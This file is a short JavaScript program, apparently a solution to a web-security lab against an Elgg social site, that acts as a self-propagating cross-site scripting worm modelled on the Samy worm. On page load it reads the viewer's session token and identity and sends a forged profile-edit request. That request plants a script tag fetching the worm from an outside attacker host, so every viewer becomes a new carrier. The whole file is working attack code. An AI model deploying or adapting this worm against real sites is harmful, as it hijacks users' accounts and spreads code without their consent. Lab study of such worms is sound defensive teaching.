window.onload = function () {
    var wormCode = encodeURIComponent(
        "<script type=\"text/javascript\" " +
        "id = \"worm\" " +
        "src=\"http://www.csrflabattacker.com/xssworm.js\">" +
        "</" + "script>");
    var desc = "&description=Samy is MY HERO" + wormCode;
    desc += "&accesslevel[description]=" + "2";

    var token = "__elgg_token=" + elgg.security.token.__elgg_token;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var name = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var content = token + ts + name + desc + guid;

    // Set the URL
    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
    var samyGuid = 47;

    // Construct and send the Ajax request.
    if (elgg.session.user.guid != samyGuid) {
        // Create and send Ajax request
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}